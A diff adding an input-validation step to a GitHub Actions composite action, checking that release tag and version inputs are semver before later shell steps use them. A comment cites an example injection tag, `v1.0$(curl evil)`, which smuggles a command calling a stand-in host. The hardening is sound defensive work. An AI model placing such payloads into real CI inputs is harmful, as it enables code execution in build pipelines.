@@ -37,6 +37,25 @@ inputs:
 runs:
   using: composite
   steps:
+    # Every downstream step interpolates `tag` (and the derived version) into
+    # shell contexts: sed replacements, filenames, git commit messages, jq
+    # --arg values. A crafted tag like `v1.0$(curl evil)` would execute inside
+    # the double-quoted sed substitution. Pushing a tag already requires repo
+    # write access, so this is defense-in-depth, not a primary boundary.
+    - name: Validate tag and version inputs
+      shell: bash
+      env:
+        TAG: ${{ inputs.tag }}
+        VERSION: ${{ inputs.version }}
+      run: |
+        SEMVER='^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?(\+[0-9A-Za-z.-]+)?$'
+        [[ "$TAG" =~ ^v${SEMVER:1} ]] || {
+          echo "::error::invalid tag format: '$TAG' (expected v<semver>)"; exit 1; }
+        if [ -n "$VERSION" ]; then
+          [[ "$VERSION" =~ $SEMVER ]] || {
+            echo "::error::invalid version format: '$VERSION' (expected semver)"; exit 1; }
+        fi
+
     - name: Sync MARKETING_VERSION to tag
       shell: bash
       env:
